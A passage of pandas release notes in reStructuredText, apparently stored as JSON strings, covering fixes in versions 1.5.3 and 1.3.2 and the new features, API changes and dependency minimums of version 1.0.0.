pandas.\n\n{{ header }}\n\n.. ---------------------------------------------------------------------------\n.. _whatsnew_153.regressions:\n\nFixed regressions\n~~~~~~~~~~~~~~~~~\n- Fixed performance regression in :meth:`Series.isin` when ``values`` is empty (:issue:`49839`)\n- Fixed regression in :meth:`DataFrame.memory_usage` showing unnecessary ``FutureWarning`` when :class:`DataFrame` is empty (:issue:`50066`)\n- Fixed regression in :meth:`.DataFrameGroupBy.transform` when used with ``as_index=False`` (:issue:`49834`)\n- Enforced reversion of ``color`` as an alias for ``c`` and ``size`` as an alias for ``s`` in function :meth:`DataFrame.plot.scatter` (:issue:`49732`)\n- Fixed regression in :meth:`.SeriesGroupBy.apply` setting a ``name`` attribute on the result if the result was a :class:`DataFrame` (:issue:`49907`)\n- Fixed performance regression in setting with the :meth:`~DataFrame.at` indexer (:issue:`49771`)\n- Fixed regression in :func:`to_datetime` raising ``ValueError`` when parsing array of ``float`` containing ``np.nan`` (:issue:`50237`)\n\n.. ---------------------------------------------------------------------------\n.. _whatsnew_153.bug_fixes:\n\nBug fixes\n~~~~~~~~~\n- Bug in the Copy-on-Write implementation losing track of views when indexing a :class:`DataFrame` with another :class:`DataFrame` (:issue:`50630`)\n- Bug in :meth:`.Styler.to_excel` leading to error when unrecognized ``border-style`` (e.g. ``\"hair\"``) provided to Excel writers (:issue:`48649`)\n- Bug in :meth:`Series.quantile` emitting warning from NumPy when :class:`Series` has only ``NA`` values (:issue:`50681`)\n- Bug when chaining several :meth:`.Styler.concat` calls, only the last styler was concatenated (:issue:`49207`)\n- Fixed bug when instantiating a :class:`DataFrame` subclass inheriting from ``typing.Generic`` that triggered a ``UserWarning`` on python 3.11 (:issue:`49649`)\n- Bug in :func:`pivot_table` with NumPy 1.24 or greater when the :class:`DataFrame` columns has nested elements (:issue:`50342`)\n- Bug in :func:`pandas.testing.assert_series_equal` (and equivalent ``assert_`` functions) when having nested data and using numpy >= 1.25 (:issue:`50360`)\n\n.. ---------------------------------------------------------------------------\n.. _whatsnew_153.other:\n\nOther\n~~~~~\n\n.. note::\n\n    If you are using :meth:`DataFrame.to_sql`, :func:`read_sql`, :func:`read_sql_table`, or :func:`read_sql_query` with SQLAlchemy 1.4.46 or greater,\n    you may see a ``sqlalchemy.exc.RemovedIn20Warning``. These warnings can be safely ignored for the SQLAlchemy 1.4.x releases\n    as pandas works toward compatibility with SQLAlchemy 2.0.\n\n- Reverted deprecation (:issue:`45324`) of behavior of :meth:`Series.__getitem__` and :meth:`Series.__setitem__` slicing with an integer :class:`Index`; this will remain positional (:issue:`49612`)\n- A ``FutureWarning`` raised when attempting to set values inplace with :meth:`DataFrame.loc` or :meth:`DataFrame.iloc` has been changed to a ``DeprecationWarning`` (:issue:`48673`)\n\n.. ---------------------------------------------------------------------------\n.. _whatsnew_153.contributors:\n\nContributors\n~~~~~~~~~~~~\n\n.. contributors:: v1.5.2..v1.5.3\n", "1.3.2": ".. _whatsnew_132:\n\nWhat's new in 1.3.2 (August 15, 2021)\n-------------------------------------\n\nThese are the changes in pandas 1.3.2. See :ref:`release` for a full changelog\nincluding other versions of pandas.\n\n{{ header }}\n\n.. ---------------------------------------------------------------------------\n\n.. _whatsnew_132.regressions:\n\nFixed regressions\n~~~~~~~~~~~~~~~~~\n- Performance regression in :meth:`DataFrame.isin` and :meth:`Series.isin` for nullable data types (:issue:`42714`)\n- Regression in updating values of :class:`Series` using boolean index, created by using :meth:`DataFrame.pop` (:issue:`42530`)\n- Regression in :meth:`DataFrame.from_records` with empty records (:issue:`42456`)\n- Fixed regression in :meth:`DataFrame.shift` where ``TypeError`` occurred when shifting DataFrame created by concatenation of slices and fills with values (:issue:`42719`)\n- Regression in :meth:`DataFrame.agg` when the ``func`` argument returned lists and ``axis=1`` (:issue:`42727`)\n- Regression in :meth:`DataFrame.drop` does nothing if :class:`MultiIndex` has duplicates and indexer is a tuple or list of tuples (:issue:`42771`)\n- Fixed regression where :func:`read_csv` raised a ``ValueError`` when parameters ``names`` and ``prefix`` were both set to ``None`` (:issue:`42387`)\n- Fixed regression in comparisons between :class:`Timestamp` object and ``datetime64`` objects outside the implementation bounds for nanosecond ``datetime64`` (:issue:`42794`)\n- Fixed regression in :meth:`.Styler.highlight_min` and :meth:`.Styler.highlight_max` where ``pandas.NA`` was not successfully ignored (:issue:`42650`)\n- Fixed regression in :func:`concat` where ``copy=False`` was not honored in ``axis=1`` Series concatenation (:issue:`42501`)\n- Regression in :meth:`Series.nlargest` and :meth:`Series.nsmallest` with nullable integer or float dtype (:issue:`42816`)\n- Fixed regression in :meth:`Series.quantile` with :class:`Int64Dtype` (:issue:`42626`)\n- Fixed regression in :meth:`Series.groupby` and :meth:`DataFrame.groupby` where supplying the ``by`` argument with a Series named with a tuple would incorrectly raise (:issue:`42731`)\n\n.. ---------------------------------------------------------------------------\n\n.. _whatsnew_132.bug_fixes:\n\nBug fixes\n~~~~~~~~~\n- Bug in :func:`read_excel` modifies the dtypes dictionary when reading a file with duplicate columns (:issue:`42462`)\n- 1D slices over extension types turn into N-dimensional slices over ExtensionArrays (:issue:`42430`)\n- Fixed bug in :meth:`Series.rolling` and :meth:`DataFrame.rolling` not calculating window bounds correctly for the first row when ``center=True`` and ``window`` is an offset that covers all the rows (:issue:`42753`)\n- :meth:`.Styler.hide_columns` now hides the index name header row as well as column headers (:issue:`42101`)\n- :meth:`.Styler.set_sticky` has amended CSS to control the column/index names and ensure the correct sticky positions (:issue:`42537`)\n- Bug in de-serializing datetime indexes in PYTHONOPTIMIZED mode (:issue:`42866`)\n\n.. ---------------------------------------------------------------------------\n\n.. _whatsnew_132.contributors:\n\nContributors\n~~~~~~~~~~~~\n\n.. contributors:: v1.3.1..v1.3.2\n", "1.0.0": ".. _whatsnew_100:\n\nWhat's new in 1.0.0 (January 29, 2020)\n--------------------------------------\n\nThese are the changes in pandas 1.0.0. See :ref:`release` for a full changelog\nincluding other versions of pandas.\n\n.. note::\n\n    The pandas 1.0 release removed a lot of functionality that was deprecated\n    in previous releases (see :ref:`below <whatsnew_100.prior_deprecations>`\n    for an overview). It is recommended to first upgrade to pandas 0.25 and to\n    ensure your code is working without warnings, before upgrading to pandas\n    1.0.\n\n\nNew deprecation policy\n~~~~~~~~~~~~~~~~~~~~~~\n\nStarting with pandas 1.0.0, pandas will adopt a variant of `SemVer`_ to\nversion releases. Briefly,\n\n* Deprecations will be introduced in minor releases (e.g. 1.1.0, 1.2.0, 2.1.0, ...)\n* Deprecations will be enforced in major releases (e.g. 1.0.0, 2.0.0, 3.0.0, ...)\n* API-breaking changes will be made only in major releases (except for experimental features)\n\nSee :ref:`policies.version` for more.\n\n.. _2019 Pandas User Survey: https://pandas.pydata.org/community/blog/2019-user-survey.html\n.. _SemVer: https://semver.org\n\n{{ header }}\n\n.. ---------------------------------------------------------------------------\n\nEnhancements\n~~~~~~~~~~~~\n\n.. _whatsnew_100.numba_rolling_apply:\n\nUsing Numba in ``rolling.apply`` and ``expanding.apply``\n^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n\nWe've added an ``engine`` keyword to :meth:`~core.window.rolling.Rolling.apply` and :meth:`~core.window.expanding.Expanding.apply`\nthat allows the user to execute the routine using `Numba <https://numba.pydata.org/>`__ instead of Cython.\nUsing the Numba engine can yield significant performance gains if the apply function can operate on numpy arrays and\nthe data set is larger (1 million rows or greater). For more details, see\n:ref:`rolling apply documentation <window.numba_engine>` (:issue:`28987`, :issue:`30936`)\n\n.. _whatsnew_100.custom_window:\n\nDefining custom windows for rolling operations\n^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n\nWe've added a :func:`pandas.api.indexers.BaseIndexer` class that allows users to define how\nwindow bounds are created during ``rolling`` operations. Users can define their own ``get_window_bounds``\nmethod on a :func:`pandas.api.indexers.BaseIndexer` subclass that will generate the start and end\nindices used for each window during the rolling aggregation. For more details and example usage, see\nthe :ref:`custom window rolling documentation <window.custom_rolling_window>`\n\n.. _whatsnew_100.to_markdown:\n\nConverting to markdown\n^^^^^^^^^^^^^^^^^^^^^^\n\nWe've added :meth:`~DataFrame.to_markdown` for creating a markdown table (:issue:`11052`)\n\n.. ipython:: python\n\n   df = pd.DataFrame({\"A\": [1, 2, 3], \"B\": [1, 2, 3]}, index=['a', 'a', 'b'])\n   print(df.to_markdown())\n\nExperimental new features\n~~~~~~~~~~~~~~~~~~~~~~~~~\n\n.. _whatsnew_100.NA:\n\nExperimental ``NA`` scalar to denote missing values\n^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n\nA new ``pd.NA`` value (singleton) is introduced to represent scalar missing\nvalues. Up to now, pandas used several values to represent missing data: ``np.nan`` is used for this for float data, ``np.nan`` or\n``None`` for object-dtype data and ``pd.NaT`` for datetime-like data. The\ngoal of ``pd.NA`` is to provide a \"missing\" indicator that can be used\nconsistently across data types. ``pd.NA`` is currently used by the nullable integer and boolean\ndata types and the new string data type (:issue:`28095`).\n\n.. warning::\n\n   Experimental: the behaviour of ``pd.NA`` can still change without warning.\n\nFor example, creating a Series using the nullable integer dtype:\n\n.. ipython:: python\n\n    s = pd.Series([1, 2, None], dtype=\"Int64\")\n    s\n    s[2]\n\nCompared to ``np.nan``, ``pd.NA`` behaves differently in certain operations.\nIn addition to arithmetic operations, ``pd.NA`` also propagates as \"missing\"\nor \"unknown\" in comparison operations:\n\n.. ipython:: python\n\n    np.nan > 1\n    pd.NA > 1\n\nFor logical operations, ``pd.NA`` follows the rules of the\n`three-valued logic <https://en.wikipedia.org/wiki/Three-valued_logic>`__ (or\n*Kleene logic*). For example:\n\n.. ipython:: python\n\n    pd.NA | True\n\nFor more, see :ref:`NA section <missing_data.NA>` in the user guide on missing\ndata.\n\n\n.. _whatsnew_100.string:\n\nDedicated string data type\n^^^^^^^^^^^^^^^^^^^^^^^^^^\n\nWe've added :class:`StringDtype`, an extension type dedicated to string data.\nPreviously, strings were typically stored in object-dtype NumPy arrays. (:issue:`29975`)\n\n.. warning::\n\n   ``StringDtype`` is currently considered experimental. The implementation\n   and parts of the API may change without warning.\n\nThe ``'string'`` extension type solves several issues with object-dtype NumPy arrays:\n\n1. You can accidentally store a *mixture* of strings and non-strings in an\n   ``object`` dtype array. A ``StringArray`` can only store strings.\n2. ``object`` dtype breaks dtype-specific operations like :meth:`DataFrame.select_dtypes`.\n   There isn't a clear way to select *just* text while excluding non-text,\n   but still object-dtype columns.\n3. When reading code, the contents of an ``object`` dtype array is less clear\n   than ``string``.\n\n\n.. ipython:: python\n\n   pd.Series(['abc', None, 'def'], dtype=pd.StringDtype())\n\nYou can use the alias ``\"string\"`` as well.\n\n.. ipython:: python\n\n   s = pd.Series(['abc', None, 'def'], dtype=\"string\")\n   s\n\nThe usual string accessor methods work. Where appropriate, the return type\nof the Series or columns of a DataFrame will also have string dtype.\n\n.. ipython:: python\n\n   s.str.upper()\n   s.str.split('b', expand=True).dtypes\n\nString accessor methods returning integers will return a value with :class:`Int64Dtype`\n\n.. ipython:: python\n\n   s.str.count(\"a\")\n\nWe recommend explicitly using the ``string`` data type when working with strings.\nSee :ref:`text.types` for more.\n\n.. _whatsnew_100.boolean:\n\nBoolean data type with missing values support\n^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n\nWe've added :class:`BooleanDtype` / :class:`~arrays.BooleanArray`, an extension\ntype dedicated to boolean data that can hold missing values. The default\n``bool`` data type based on a bool-dtype NumPy array, the column can only hold\n``True`` or ``False``, and not missing values. This new :class:`~arrays.BooleanArray`\ncan store missing values as well by keeping track of this in a separate mask.\n(:issue:`29555`, :issue:`30095`, :issue:`31131`)\n\n.. ipython:: python\n\n   pd.Series([True, False, None], dtype=pd.BooleanDtype())\n\nYou can use the alias ``\"boolean\"`` as well.\n\n.. ipython:: python\n\n   s = pd.Series([True, False, None], dtype=\"boolean\")\n   s\n\n.. _whatsnew_100.convert_dtypes:\n\nMethod ``convert_dtypes`` to ease use of supported extension dtypes\n^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n\nIn order to encourage use of the extension dtypes ``StringDtype``,\n``BooleanDtype``, ``Int64Dtype``, ``Int32Dtype``, etc., that support ``pd.NA``, the\nmethods :meth:`DataFrame.convert_dtypes` and :meth:`Series.convert_dtypes`\nhave been introduced. (:issue:`29752`) (:issue:`30929`)\n\nExample:\n\n.. ipython:: python\n\n   df = pd.DataFrame({'x': ['abc', None, 'def'],\n                      'y': [1, 2, np.nan],\n                      'z': [True, False, True]})\n   df\n   df.dtypes\n\n.. ipython:: python\n\n   converted = df.convert_dtypes()\n   converted\n   converted.dtypes\n\nThis is especially useful after reading in data using readers such as :func:`read_csv`\nand :func:`read_excel`.\nSee :ref:`here <missing_data.NA.conversion>` for a description.\n\n\n.. _whatsnew_100.enhancements.other:\n\nOther enhancements\n~~~~~~~~~~~~~~~~~~\n\n- :meth:`DataFrame.to_string` added the ``max_colwidth`` parameter to control when wide columns are truncated (:issue:`9784`)\n- Added the ``na_value`` argument to :meth:`Series.to_numpy`, :meth:`Index.to_numpy` and :meth:`DataFrame.to_numpy` to control the value used for missing data (:issue:`30322`)\n- :meth:`MultiIndex.from_product` infers level names from inputs if not explicitly provided (:issue:`27292`)\n- :meth:`DataFrame.to_latex` now accepts ``caption`` and ``label`` arguments (:issue:`25436`)\n- DataFrames with :ref:`nullable integer <integer_na>`, the :ref:`new string dtype <text.types>`\n  and period data type can now be converted to ``pyarrow`` (>=0.15.0), which means that it is\n  supported in writing to the Parquet file format when using the ``pyarrow`` engine (:issue:`28368`).\n  Full roundtrip to parquet (writing and reading back in with :meth:`~DataFrame.to_parquet` / :func:`read_parquet`)\n  is supported starting with pyarrow >= 0.16 (:issue:`20612`).\n- :func:`to_parquet` now appropriately handles the ``schema`` argument for user defined schemas in the pyarrow engine. (:issue:`30270`)\n- :meth:`DataFrame.to_json` now accepts an ``indent`` integer argument to enable pretty printing of JSON output (:issue:`12004`)\n- :meth:`read_stata` can read Stata 119 dta files. (:issue:`28250`)\n- Implemented :meth:`.Window.var` and :meth:`.Window.std` functions (:issue:`26597`)\n- Added ``encoding`` argument to :meth:`DataFrame.to_string` for non-ascii text (:issue:`28766`)\n- Added ``encoding`` argument to :func:`DataFrame.to_html` for non-ascii text (:issue:`28663`)\n- :meth:`Styler.background_gradient` now accepts ``vmin`` and ``vmax`` arguments (:issue:`12145`)\n- :meth:`Styler.format` added the ``na_rep`` parameter to help format the missing values (:issue:`21527`, :issue:`28358`)\n- :func:`read_excel` now can read binary Excel (``.xlsb``) files by passing ``engine='pyxlsb'``. For more details and example usage, see the :ref:`Binary Excel files documentation <io.xlsb>`. Closes :issue:`8540`.\n- The ``partition_cols`` argument in :meth:`DataFrame.to_parquet` now accepts a string (:issue:`27117`)\n- :func:`pandas.read_json` now parses ``NaN``, ``Infinity`` and ``-Infinity`` (:issue:`12213`)\n- DataFrame constructor preserve ``ExtensionArray`` dtype with ``ExtensionArray`` (:issue:`11363`)\n- :meth:`DataFrame.sort_values` and :meth:`Series.sort_values` have gained ``ignore_index`` keyword to be able to reset index after sorting (:issue:`30114`)\n- :meth:`DataFrame.sort_index` and :meth:`Series.sort_index` have gained ``ignore_index`` keyword to reset index (:issue:`30114`)\n- :meth:`DataFrame.drop_duplicates` has gained ``ignore_index`` keyword to reset index (:issue:`30114`)\n- Added new writer for exporting Stata dta files in versions 118 and 119, ``StataWriterUTF8``.  These files formats support exporting strings containing Unicode characters. Format 119 supports data sets with more than 32,767 variables (:issue:`23573`, :issue:`30959`)\n- :meth:`Series.map` now accepts ``collections.abc.Mapping`` subclasses as a mapper (:issue:`29733`)\n- Added an experimental :attr:`~DataFrame.attrs` for storing global metadata about a dataset (:issue:`29062`)\n- :meth:`Timestamp.fromisocalendar` is now compatible with python 3.8 and above (:issue:`28115`)\n- :meth:`DataFrame.to_pickle` and :func:`read_pickle` now accept URL (:issue:`30163`)\n\n\n\n.. ---------------------------------------------------------------------------\n\n.. _whatsnew_100.api_breaking:\n\nBackwards incompatible API changes\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n\n.. _whatsnew_100.api_breaking.MultiIndex._names:\n\nAvoid using names from ``MultiIndex.levels``\n^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n\nAs part of a larger refactor to :class:`MultiIndex` the level names are now\nstored separately from the levels (:issue:`27242`). We recommend using\n:attr:`MultiIndex.names` to access the names, and :meth:`Index.set_names`\nto update the names.\n\nFor backwards compatibility, you can still *access* the names via the levels.\n\n.. ipython:: python\n\n   mi = pd.MultiIndex.from_product([[1, 2], ['a', 'b']], names=['x', 'y'])\n   mi.levels[0].name\n\nHowever, it is no longer possible to *update* the names of the ``MultiIndex``\nvia the level.\n\n.. ipython:: python\n   :okexcept:\n\n   mi.levels[0].name = \"new name\"\n   mi.names\n\nTo update, use ``MultiIndex.set_names``, which returns a new ``MultiIndex``.\n\n.. ipython:: python\n\n   mi2 = mi.set_names(\"new name\", level=0)\n   mi2.names\n\nNew repr for :class:`~pandas.arrays.IntervalArray`\n^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n\n:class:`pandas.arrays.IntervalArray` adopts a new ``__repr__`` in accordance with other array classes (:issue:`25022`)\n\n*pandas 0.25.x*\n\n.. code-block:: ipython\n\n   In [1]: pd.arrays.IntervalArray.from_tuples([(0, 1), (2, 3)])\n   Out[2]:\n   IntervalArray([(0, 1], (2, 3]],\n                 closed='right',\n                 dtype='interval[int64]')\n\n*pandas 1.0.0*\n\n.. ipython:: python\n\n   pd.arrays.IntervalArray.from_tuples([(0, 1), (2, 3)])\n\n``DataFrame.rename`` now only accepts one positional argument\n^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n\n:meth:`DataFrame.rename` would previously accept positional arguments that would lead\nto ambiguous or undefined behavior. From pandas 1.0, only the very first argument, which\nmaps labels to their new names along the default axis, is allowed to be passed by position\n(:issue:`29136`).\n\n.. ipython:: python\n   :suppress:\n\n   df = pd.DataFrame([[1]])\n\n*pandas 0.25.x*\n\n.. code-block:: ipython\n\n   In [1]: df = pd.DataFrame([[1]])\n   In [2]: df.rename({0: 1}, {0: 2})\n   Out[2]:\n   FutureWarning: ...Use named arguments to resolve ambiguity...\n      2\n   1  1\n\n*pandas 1.0.0*\n\n.. code-block:: ipython\n\n   In [3]: df.rename({0: 1}, {0: 2})\n   Traceback (most recent call last):\n   ...\n   TypeError: rename() takes from 1 to 2 positional arguments but 3 were given\n\nNote that errors will now be raised when conflicting or potentially ambiguous arguments are provided.\n\n*pandas 0.25.x*\n\n.. code-block:: ipython\n\n   In [4]: df.rename({0: 1}, index={0: 2})\n   Out[4]:\n      0\n   1  1\n\n   In [5]: df.rename(mapper={0: 1}, index={0: 2})\n   Out[5]:\n      0\n   2  1\n\n*pandas 1.0.0*\n\n.. code-block:: ipython\n\n   In [6]: df.rename({0: 1}, index={0: 2})\n   Traceback (most recent call last):\n   ...\n   TypeError: Cannot specify both 'mapper' and any of 'index' or 'columns'\n\n   In [7]: df.rename(mapper={0: 1}, index={0: 2})\n   Traceback (most recent call last):\n   ...\n   TypeError: Cannot specify both 'mapper' and any of 'index' or 'columns'\n\nYou can still change the axis along which the first positional argument is applied by\nsupplying the ``axis`` keyword argument.\n\n.. ipython:: python\n\n   df.rename({0: 1})\n   df.rename({0: 1}, axis=1)\n\nIf you would like to update both the index and column labels, be sure to use the respective\nkeywords.\n\n.. ipython:: python\n\n   df.rename(index={0: 1}, columns={0: 2})\n\nExtended verbose info output for :class:`~pandas.DataFrame`\n^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n\n:meth:`DataFrame.info` now shows line numbers for the columns summary (:issue:`17304`)\n\n*pandas 0.25.x*\n\n.. code-block:: ipython\n\n   In [1]: df = pd.DataFrame({\"int_col\": [1, 2, 3],\n   ...                    \"text_col\": [\"a\", \"b\", \"c\"],\n   ...                    \"float_col\": [0.0, 0.1, 0.2]})\n   In [2]: df.info(verbose=True)\n   <class 'pandas.core.frame.DataFrame'>\n   RangeIndex: 3 entries, 0 to 2\n   Data columns (total 3 columns):\n   int_col      3 non-null int64\n   text_col     3 non-null object\n   float_col    3 non-null float64\n   dtypes: float64(1), int64(1), object(1)\n   memory usage: 152.0+ bytes\n\n*pandas 1.0.0*\n\n.. ipython:: python\n\n   df = pd.DataFrame({\"int_col\": [1, 2, 3],\n                      \"text_col\": [\"a\", \"b\", \"c\"],\n                      \"float_col\": [0.0, 0.1, 0.2]})\n   df.info(verbose=True)\n\n:meth:`pandas.array` inference changes\n^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n\n:meth:`pandas.array` now infers pandas' new extension types in several cases (:issue:`29791`):\n\n1. String data (including missing values) now returns a :class:`arrays.StringArray`.\n2. Integer data (including missing values) now returns a :class:`arrays.IntegerArray`.\n3. Boolean data (including missing values) now returns the new :class:`arrays.BooleanArray`\n\n*pandas 0.25.x*\n\n.. code-block:: ipython\n\n   In [1]: pd.array([\"a\", None])\n   Out[1]:\n   <PandasArray>\n   ['a', None]\n   Length: 2, dtype: object\n\n   In [2]: pd.array([1, None])\n   Out[2]:\n   <PandasArray>\n   [1, None]\n   Length: 2, dtype: object\n\n\n*pandas 1.0.0*\n\n.. ipython:: python\n\n   pd.array([\"a\", None])\n   pd.array([1, None])\n\nAs a reminder, you can specify the ``dtype`` to disable all inference.\n\n:class:`arrays.IntegerArray` now uses :attr:`pandas.NA`\n^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n\n:class:`arrays.IntegerArray` now uses :attr:`pandas.NA` rather than\n:attr:`numpy.nan` as its missing value marker (:issue:`29964`).\n\n*pandas 0.25.x*\n\n.. code-block:: ipython\n\n   In [1]: a = pd.array([1, 2, None], dtype=\"Int64\")\n   In [2]: a\n   Out[2]:\n   <IntegerArray>\n   [1, 2, NaN]\n   Length: 3, dtype: Int64\n\n   In [3]: a[2]\n   Out[3]:\n   nan\n\n*pandas 1.0.0*\n\n.. ipython:: python\n\n   a = pd.array([1, 2, None], dtype=\"Int64\")\n   a\n   a[2]\n\nThis has a few API-breaking consequences.\n\n**Converting to a NumPy ndarray**\n\nWhen converting to a NumPy array missing values will be ``pd.NA``, which cannot\nbe converted to a float. So calling ``np.asarray(integer_array, dtype=\"float\")``\nwill now raise.\n\n*pandas 0.25.x*\n\n.. code-block:: ipython\n\n    In [1]: np.asarray(a, dtype=\"float\")\n    Out[1]:\n    array([ 1.,  2., nan])\n\n*pandas 1.0.0*\n\n.. ipython:: python\n   :okexcept:\n\n   np.asarray(a, dtype=\"float\")\n\nUse :meth:`arrays.IntegerArray.to_numpy` with an explicit ``na_value`` instead.\n\n.. ipython:: python\n\n   a.to_numpy(dtype=\"float\", na_value=np.nan)\n\n**Reductions can return** ``pd.NA``\n\nWhen performing a reduction such as a sum with ``skipna=False``, the result\nwill now be ``pd.NA`` instead of ``np.nan`` in presence of missing values\n(:issue:`30958`).\n\n*pandas 0.25.x*\n\n.. code-block:: ipython\n\n    In [1]: pd.Series(a).sum(skipna=False)\n    Out[1]:\n    nan\n\n*pandas 1.0.0*\n\n.. ipython:: python\n\n   pd.Series(a).sum(skipna=False)\n\n**value_counts returns a nullable integer dtype**\n\n:meth:`Series.value_counts` with a nullable integer dtype now returns a nullable\ninteger dtype for the values.\n\n*pandas 0.25.x*\n\n.. code-block:: ipython\n\n   In [1]: pd.Series([2, 1, 1, None], dtype=\"Int64\").value_counts().dtype\n   Out[1]:\n   dtype('int64')\n\n*pandas 1.0.0*\n\n.. ipython:: python\n\n   pd.Series([2, 1, 1, None], dtype=\"Int64\").value_counts().dtype\n\nSee :ref:`missing_data.NA` for more on the differences between :attr:`pandas.NA`\nand :attr:`numpy.nan`.\n\n:class:`arrays.IntegerArray` comparisons return :class:`arrays.BooleanArray`\n^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n\nComparison operations on a :class:`arrays.IntegerArray` now returns a\n:class:`arrays.BooleanArray` rather than a NumPy array (:issue:`29964`).\n\n*pandas 0.25.x*\n\n.. code-block:: ipython\n\n   In [1]: a = pd.array([1, 2, None], dtype=\"Int64\")\n   In [2]: a\n   Out[2]:\n   <IntegerArray>\n   [1, 2, NaN]\n   Length: 3, dtype: Int64\n\n   In [3]: a > 1\n   Out[3]:\n   array([False,  True, False])\n\n*pandas 1.0.0*\n\n.. ipython:: python\n\n   a = pd.array([1, 2, None], dtype=\"Int64\")\n   a > 1\n\nNote that missing values now propagate, rather than always comparing unequal\nlike :attr:`numpy.nan`. See :ref:`missing_data.NA` for more.\n\nBy default :meth:`Categorical.min` now returns the minimum instead of np.nan\n^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n\nWhen :class:`Categorical` contains ``np.nan``,\n:meth:`Categorical.min` no longer return ``np.nan`` by default (skipna=True) (:issue:`25303`)\n\n*pandas 0.25.x*\n\n.. code-block:: ipython\n\n   In [1]: pd.Categorical([1, 2, np.nan], ordered=True).min()\n   Out[1]: nan\n\n\n*pandas 1.0.0*\n\n.. ipython:: python\n\n   pd.Categorical([1, 2, np.nan], ordered=True).min()\n\n\nDefault dtype of empty :class:`pandas.Series`\n^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n\nInitialising an empty :class:`pandas.Series` without specifying a dtype will raise a ``DeprecationWarning`` now\n(:issue:`17261`). The default dtype will change from ``float64`` to ``object`` in future releases so that it is\nconsistent with the behaviour of :class:`DataFrame` and :class:`Index`.\n\n*pandas 1.0.0*\n\n.. code-block:: ipython\n\n   In [1]: pd.Series()\n   Out[2]:\n   DeprecationWarning: The default dtype for empty Series will be 'object' instead of 'float64' in a future version. Specify a dtype explicitly to silence this warning.\n   Series([], dtype: float64)\n\nResult dtype inference changes for resample operations\n^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n\nThe rules for the result dtype in :meth:`DataFrame.resample` aggregations have changed for extension types (:issue:`31359`).\nPreviously, pandas would attempt to convert the result back to the original dtype, falling back to the usual\ninference rules if that was not possible. Now, pandas will only return a result of the original dtype if the\nscalar values in the result are instances of the extension dtype's scalar type.\n\n.. ipython:: python\n\n   df = pd.DataFrame({\"A\": ['a', 'b']}, dtype='category',\n                     index=pd.date_range('2000', periods=2))\n   df\n\n\n*pandas 0.25.x*\n\n.. code-block:: ipython\n\n   In [1]> df.resample(\"2D\").agg(lambda x: 'a').A.dtype\n   Out[1]:\n   CategoricalDtype(categories=['a', 'b'], ordered=False)\n\n*pandas 1.0.0*\n\n.. ipython:: python\n\n   df.resample(\"2D\").agg(lambda x: 'a').A.dtype\n\nThis fixes an inconsistency between ``resample`` and ``groupby``.\nThis also fixes a potential bug, where the **values** of the result might change\ndepending on how the results are cast back to the original dtype.\n\n*pandas 0.25.x*\n\n.. code-block:: ipython\n\n   In [1] df.resample(\"2D\").agg(lambda x: 'c')\n   Out[1]:\n\n        A\n   0  NaN\n\n*pandas 1.0.0*\n\n.. ipython:: python\n\n   df.resample(\"2D\").agg(lambda x: 'c')\n\n\n.. _whatsnew_100.api_breaking.python:\n\nIncreased minimum version for Python\n^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n\npandas 1.0.0 supports Python 3.6.1 and higher (:issue:`29212`).\n\n.. _whatsnew_100.api_breaking.deps:\n\nIncreased minimum versions for dependencies\n^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n\nSome minimum supported versions of dependencies were updated (:issue:`29766`, :issue:`29723`).\nIf installed, we now require:\n\n+-----------------+-----------------+----------+---------+\n| Package         | Minimum Version | Required | Changed |\n+=================+=================+==========+=========+\n| numpy           | 1.13.3          |    X     |         |\n+-----------------+-----------------+----------+---------+\n| pytz            | 2015.4          |    X     |         |\n+-----------------+-----------------+----------+---------+\n| python-dateutil | 2.6.1           |    X     |         |\n+-----------------+-----------------+----------+---------+\n| bottleneck      | 1.2.1           |          |         |\n+-----------------+-----------------+----------+---------+\n| numexpr         | 2.6.2           |          |         |\n+-----------------+-----------------+----------+---------+\n| pytest (dev)    | 4.0.2           |          |         |\n+-----------------+-----------------+----------+---------+\n\nFor `optional libraries <https://pandas.pydata.org/docs/getting_started/install.html>`_ the general recommendation is to use the latest version.\nThe following table lists the lowest version per library that is currently being tested throughout the development of pandas.\nOptional libraries below the lowest tested version may still work, but are not considered supported.\n\n+-----------------+-----------------+---------+\n| Package         | Minimum Version | Changed |\n+=================+=================+=========+\n| beautifulsoup4  | 4.6.0           |         |\n+-----------------+-----------------+---------+\n| fastparquet     | 0.3.2           |    X    |\n+-----------------+-----------------+---------+\n| gcsfs           | 0.2.2           |         |\n+-----------------+-----------------+---------+\n| lxml            | 3.8.0           |         |\n+-----------------+-----------------+---------+\n| matplotlib      | 2.2.2           |         |\n+-----------------+-----------------+---------+\n| numba           | 0.46.0          |    X    |\n+-----------------+-----------------+---------+\n| openpyxl        | 2.5.7           |    X    |\n+-----------------+-----------------+---------+\n| pyarrow         | 0.13.0          |    X    |\n+-----------------+-----------------+---------+\n| pymysql         | 0.7.1           |         